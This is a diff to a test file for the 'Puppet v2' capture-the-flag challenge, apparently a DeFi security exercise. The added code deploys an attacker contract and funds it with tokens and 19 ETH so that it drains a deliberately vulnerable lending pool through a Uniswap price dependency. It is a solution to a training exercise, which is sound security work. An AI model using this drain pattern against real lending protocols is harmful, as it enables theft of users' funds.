@@ -82,12 +82,34 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const HackFactory = await ethers.getContractFactory(
+          "contracts/puppet-v2/Hack.sol:Hack",
+          attacker,
+        );
+        const Hack = await HackFactory.deploy();
+
+        const tokenAttached = this.token.connect(attacker);
+        await tokenAttached.transfer(
+          Hack.address,
+          ATTACKER_INITIAL_TOKEN_BALANCE,
+        );
+        await Hack.run(
+          this.token.address,
+          this.uniswapRouter.address,
+          this.lendingPool.address,
+          this.weth.address,
+          {
+            value: ethers.utils.parseEther('19')
+          }
+        );
+
+        console.log('Attacker\s balance: ' + await this.token.balanceOf(attacker.address));
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
-        // Attacker has taken all tokens from the pool        
+        // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.eq('0');
